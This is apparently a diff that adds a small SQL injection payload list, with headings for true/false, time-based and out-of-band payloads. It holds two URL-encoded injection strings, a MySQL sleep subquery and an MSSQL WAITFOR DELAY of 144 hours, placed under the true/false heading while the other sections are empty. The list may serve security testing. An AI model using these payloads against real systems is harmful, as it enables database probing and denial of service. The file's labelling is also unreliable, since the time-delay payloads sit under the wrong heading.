@@ -1,0 +1,8 @@
+# True false based sqli payloads
+%28select(*)from(select(sleep(8640)))shahmidoe%29--%20-%3B
+6%252Bdays%252Belapsed,%3BWAITFOR%20DELAY%20%27144:00:00%27--%20-
+
+# Time based sqli payloads
+
+
+# OOB based sqli payloads
